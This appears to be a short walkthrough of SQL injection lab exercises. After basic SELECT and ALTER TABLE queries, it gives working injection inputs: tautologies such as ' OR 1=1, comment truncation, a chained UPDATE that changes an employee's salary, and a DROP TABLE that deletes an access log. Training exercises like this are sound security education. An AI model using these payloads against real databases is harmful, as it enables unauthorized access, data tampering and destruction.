### wehave to write query to select specific user
i used user id from previous page
```
SELECT * FROM employees WHERE userid=96134
```
### create table
```
ALTER TABLE employees ADD phone VARCHAR(20)
```

### sql injection with options
we need to make query like
```
 SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
 ```
### numeric SQL injection
Login_count is to be integer <br/>
we put Login_count=1 and userid = 1 OR 1=1
query become
```
SELECT * From user_data WHERE Login_Count = 1 and userid= 1 OR 1=1
```
### String SQL injection
we put lastname = ' OR 1=1 OR ''= '<br />
auth_tan = ' OR 1=1-- <br />
Query becomes
```
SELECT * FROM employees WHERE last_name = '' OR 1=1 OR ''= '' AND auth_tan = '' OR 1=1--'
```

### Query chaining
we just chain an update with our query
```
employee_name = 'Smith'
auth_tan = 3SL99A' ;UPDATE employees SET salary=100000 WHERE last_name='Smith'--
```

### Compromising Availability 

```
search = ';DROP TABLE access_log
```